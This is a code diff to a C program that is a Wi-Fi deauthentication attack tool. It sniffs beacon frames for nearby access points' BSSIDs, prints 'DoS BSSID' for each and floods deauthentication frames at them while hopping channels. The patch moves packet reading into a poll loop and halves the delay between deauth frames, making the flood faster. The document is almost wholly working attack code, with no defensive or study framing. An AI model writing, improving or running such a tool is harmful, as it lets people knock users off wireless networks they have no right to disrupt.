@@ -161,13 +161,10 @@ ssize_t iw_read(int fd, void *buf, size_t count, uint8_t **pkt, size_t *pkt_sz) 
 	struct radiotap_hdr *rt_hdr;
 	int r;
 
-	// read packet, nonblocking mode
-	r = recv(fd, buf, count, MSG_DONTWAIT);
-	if (r < 0) {
-		if (errno == EAGAIN) // no packets to recieve
-			return -EAGAIN;
+	// read packet
+	r = recv(fd, buf, count, 0);
+	if (r < 0)
 		return_error("recv");
-	}
 
 	rt_hdr = buf;
 	if (sizeof(*rt_hdr) >= r || rt_hdr->len >= r)
@@ -221,7 +218,7 @@ int send_deauth(int fd, unsigned char *ap_mac) {
 			free(deauth);
 			return GOTERR;
 		}
-		usleep(2000);
+		usleep(1000);
 	}
 
 	free(deauth);
@@ -236,9 +233,7 @@ int read_bssid(int fd, uint8_t *bssid) {
 	struct mgmt_frame *beacon;
 
 	r = iw_read(fd, buf, sizeof(buf), &pkt, &pkt_sz);
-	if (r == -EAGAIN)
-		return -EAGAIN;
-	else if (r < 0)
+	if (r < 0)
 		return GOTERR;
 
 	beacon = (struct mgmt_frame*)pkt;
@@ -265,7 +260,7 @@ int main(int argc, char *argv[]) {
 	struct dev dev;
 	uint8_t bssid[IFHWADDRLEN];
 	sigset_t exit_sig;
-	struct pollfd pfd;
+	struct pollfd pfd[2];
 	time_t tm1;
 	int chan, ret, sigfd;
 
@@ -296,9 +291,9 @@ int main(int argc, char *argv[]) {
 		return EXIT_FAILURE;
 	}
 
-	pfd.fd = sigfd;
-	pfd.revents = 0;
-	pfd.events = POLLIN;
+	pfd[0].fd = sigfd;
+	pfd[0].revents = 0;
+	pfd[0].events = POLLIN;
 
 
 	init_dev(&dev);
@@ -308,6 +303,10 @@ int main(int argc, char *argv[]) {
 		print_error();
 		goto _errout;
 	}
+
+	pfd[1].fd = dev.fd;
+	pfd[1].revents = 0;
+	pfd[1].events = POLLIN;
 
 	tm1 = time(NULL);
 	chan = 1;
@@ -319,13 +318,31 @@ int main(int argc, char *argv[]) {
 	printf("Channel: %d\n", dev.chan);
 
 	while (1) {
-		if (poll(&pfd, 1, 0) < 0) {
+		if (poll(pfd, 2, 0) < 0) {
 			err_msg("poll");
 			goto _errout;
 		}
 
-		if (pfd.revents & POLLIN) // got SIGTERM or SIGINT
+		if (pfd[0].revents & POLLIN) // got SIGTERM or SIGINT
 			break;
+
+		if (pfd[1].revents & POLLIN) {
+			ret = read_bssid(dev.fd, bssid);
+			if (ret == -EAGAIN)
+				continue;
+			if (ret < 0) { // error
+				print_error();
+				goto _errout;
+			} else { // got BSSID
+				printf("DoS BSSID ");
+				print_mac(bssid);
+				printf("\n");
+				if (send_deauth(dev.fd, bssid) < 0) {
+					print_error();
+					goto _errout;
+				}
+			}
+		}
 
 		if (time(NULL) - tm1 >= 3) { // change channel every 3 seconds
 			chan = (chan % 13) + 1;
@@ -337,21 +354,6 @@ int main(int argc, char *argv[]) {
 			tm1 = time(NULL);
 		}
 
-		ret = read_bssid(dev.fd, bssid);
-		if (ret == -EAGAIN)
-			continue;
-		if (ret < 0) { // error
-			print_error();
-			goto _errout;
-		} else { // got BSSID
-			printf("DoS BSSID ");
-			print_mac(bssid);
-			printf("\n");
-			if (send_deauth(dev.fd, bssid) < 0) {
-				print_error();
-				goto _errout;
-			}
-		}
 	}
 
 	printf("\nExiting..\n");
